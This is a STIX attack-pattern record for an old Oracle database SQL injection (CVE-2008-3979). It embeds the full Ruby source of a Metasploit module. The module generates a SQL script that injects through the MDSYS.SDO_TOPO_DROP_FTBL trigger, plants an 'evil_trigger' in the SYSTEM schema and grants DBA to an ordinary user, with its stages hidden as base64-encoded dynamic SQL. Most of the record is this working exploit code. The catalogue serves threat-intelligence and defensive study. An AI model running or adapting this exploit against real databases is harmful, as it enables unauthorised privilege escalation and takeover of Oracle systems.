{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--38b27096-a477-4ee8-8836-16f11ab9ea97",
    "created": "2024-08-14T16:22:08.694156Z",
    "modified": "2024-08-14T16:22:08.694159Z",
    "name": "Oracle DB SQL Injection in MDSYS.SDO_TOPO_DROP_FTBL Trigger",
    "description": " This module will escalate an Oracle DB user to MDSYS by exploiting a sql injection bug in the MDSYS.SDO_TOPO_DROP_FTBL trigger. After that exploit escalate user to DBA using \"CREATE ANY TRIGGER\" privilege given to MDSYS user by creating evil trigger in system scheme (2-stage attack). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/sqli/oracle/droptable_trigger.rb",
            "external_id": "droptable_trigger.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-3979"
        },
        {
            "source_name": "reference",
            "url": "http://www.securityfocus.com/archive/1/500061"
        },
        {
            "source_name": "reference",
            "url": "http://www.ngssoftware.com/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle DB SQL Injection in MDSYS.SDO_TOPO_DROP_FTBL Trigger',\n      'Description'    => %q{\n          This module will escalate an Oracle DB user to MDSYS by exploiting a sql injection bug in\n          the MDSYS.SDO_TOPO_DROP_FTBL trigger. After that exploit escalate user to DBA using \"CREATE ANY TRIGGER\" privilege\n          given to MDSYS user by creating evil trigger in system scheme (2-stage attack).\n      },\n      'Author'         => [ 'Sh2kerr <research[ad]dsec.ru>' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2008-3979' ],\n          [ 'OSVDB', '51354' ],\n          [ 'URL', 'http://www.securityfocus.com/archive/1/500061' ],\n          [ 'URL', 'http://www.ngssoftware.com/' ],\n        ],\n      'DisclosureDate' => '2009-01-13'))\n\n      register_options(\n        [\n          OptString.new('SQL',      [ false, 'The SQL to execute.',  'GRANT DBA TO SCOTT']),\n          OptString.new('USER',      [ false, 'The current user. ',  'SCOTT']),\n          OptString.new('FILENAME', [ false, 'The file name.',  'msf.sql'])\n        ])\n  end\n\n  def run\n    name1  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n    name2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n    rand1 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n    rand2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n    rand3 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n    rand4 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n    rand5 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n\n    function1 = %Q|\n      CREATE OR REPLACE PROCEDURE #{name1}\n      AUTHID CURRENT_USER AS\n      PRAGMA AUTONOMOUS_TRANSACTION;\n      BEGIN EXECUTE IMMEDIATE '#{datastore['SQL']}';\n      END;\n      |\n\n\n    function2 = %Q|\n      CREATE OR REPLACE FUNCTION #{name2} RETURN number AUTHID CURRENT_USER is\n      PRAGMA AUTONOMOUS_TRANSACTION;\n      STMT VARCHAR2(400):= 'create or replace trigger system.evil_trigger before insert on system.DEF$_TEMP$LOB DECLARE msg VARCHAR2(10);\n      BEGIN #{datastore['USER']}.#{name1};\n      end evil_trigger;';\n      BEGIN\n      EXECUTE IMMEDIATE STMT;\n      COMMIT;\n      RETURN 1;\n      END;\n      |\n\n    prepare =\"create table \\\"O' and 1=#{datastore['USER']}.#{name2}--\\\"(id number)\"\n\n    exploiting1 =\"drop table \\\"O' and 1=#{datastore['USER']}.#{name2}--\\\"\"\n\n    exploiting2 = \"insert into system.DEF$_TEMP$LOB (TEMP$BLOB) VALUES ('AA')\"\n\n    fun1  = Rex::Text.encode_base64(function1)\n    fun2 = Rex::Text.encode_base64(function2)\n    prp  = Rex::Text.encode_base64(prepare)\n    exp1 = Rex::Text.encode_base64(exploiting1)\n    exp2 = Rex::Text.encode_base64(exploiting2)\n\n\n    sql = %Q|\n      DECLARE\n      #{rand1} VARCHAR2(32767);\n      #{rand2} VARCHAR2(32767);\n      #{rand3} VARCHAR2(32767);\n      #{rand4} VARCHAR2(32767);\n      #{rand5} VARCHAR2(32767);\n      BEGIN\n      #{rand1} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{fun1}')));\n      EXECUTE IMMEDIATE #{rand1};\n      EXECUTE IMMEDIATE 'GRANT EXECUTE ON #{name1} TO PUBLIC';\n      #{rand2} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{fun2}')));\n      EXECUTE IMMEDIATE #{rand2};\n      EXECUTE IMMEDIATE 'GRANT EXECUTE ON #{name2} TO PUBLIC';\n      #{rand3} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{prp}')));\n      EXECUTE IMMEDIATE #{rand3};\n      #{rand4} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{exp1}')));\n      EXECUTE IMMEDIATE #{rand4};\n      #{rand5} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{exp2}')));\n      EXECUTE IMMEDIATE #{rand5};\n      END;\n      /\n      DROP FUNCTION #{name1};\n      DROP FUNCTION #{name2};\n      |\n\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(sql)\n\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-01-13"
}